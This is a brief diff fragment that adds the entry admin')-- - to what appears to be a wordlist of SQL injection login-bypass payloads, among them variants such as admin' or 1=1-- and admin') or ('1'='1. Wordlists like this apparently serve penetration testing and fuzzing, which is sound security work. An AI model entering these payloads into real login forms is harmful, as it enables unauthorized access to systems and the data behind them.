@@ -160,6 +160,7 @@ admin'or 1=1 or ''='
 admin' or 1=1--
 admin' or 1=1#
 admin' or 1=1/*
+admin')-- -
 admin') or ('1'='1
 admin') or ('1'='1'--
 admin') or ('1'='1'#
